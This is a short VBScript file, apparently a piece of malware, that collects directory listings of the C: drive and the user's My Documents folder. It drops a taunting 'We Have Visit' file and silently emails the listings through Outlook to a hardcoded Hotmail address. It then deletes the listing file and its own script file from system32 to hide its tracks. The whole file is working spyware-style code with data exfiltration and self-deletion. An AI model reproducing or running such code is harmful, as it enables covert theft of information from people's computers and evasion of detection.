Set oShell = CreateObject("WScript.Shell")
dim path
path =" ""C:\Documents and Settings\%username%\My Documents"" "

' To use build in commands (in cmd.exe/command.com) like dir and del,
' you can use %comspec% /c from the Run method:
oShell.Run "%comspec% /c dir c:\ > c:\abcd.txt", 1, True
oShell.Run "%comspec% /c dir "&path&" >> c:\abcd.txt", 1, True
oShell.Run "%comspec% /c echo We Have Visit In Your Computer > c:\doc.doc", 1, True


'====
' using Outlook automation...
'====
'
strBody = "<html><body>The Mail Was Send<b> </b> </body></html>"
set otlOutlook = CreateObject("outlook.application")
olMailItem = 0
set otlMailItem = otlOutlook.createItem(olMailItem)
otlMailItem.subject = strSubject
otlMailItem.htmlbody = strBody
otlMailItem.to = "liorra@hotmail.com"
set otlAttach = otlMailItem.Attachments.Add("c:\abcd.txt",1)
otlAttach.DisplayName = strFileName
oShell.Run "%comspec% /c del c:\abcd.txt", 1, True
oShell.Run "%comspec% /c del %windir\system32\mail.vbs", 1, True
otlMailItem.send
